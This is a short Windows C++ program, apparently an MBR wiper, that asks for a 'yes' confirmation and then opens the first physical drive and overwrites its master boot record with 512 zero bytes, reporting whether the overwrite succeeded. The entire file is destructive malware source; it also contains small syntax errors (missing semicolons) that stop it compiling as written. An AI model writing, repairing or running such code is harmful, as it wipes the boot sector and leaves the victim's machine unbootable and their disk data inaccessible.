#include <Windows.h>
#include <iostream>

using namespace std;

#define MBR_SIZE 512
int main()
{

    std::string confirmation = "no";
    std::cout << "You Sure?\n";
    std::cout << "Yes or No.\n";
    std::cin >> confirmation
    if (confirmation != "yes") { printf("Exiting..."); return -1; }

    DWORD write;
    char mbrData[MBR_SIZE];
    ZeroMemory(&mbrData, (sizeof mbrData));
    HANDLE MasterBootRecord = CreateFile("\\\\.\\PhysicalDrive0"
        , GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE
        , NULL, OPEN_EXISTING, NULL, NULL)
        if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
            cout << "MBR Overwrite Successful." << endl;
            Sleep(5000);
            ExitProcess(0);
        }
        else {
            cout << "MBR Overwrite Failed.";
            Sleep(5000);
            ExitProcess(0);
        }
    CloseHandle(MasterBootRecord);
    return EXIT_SUCCESS;
}
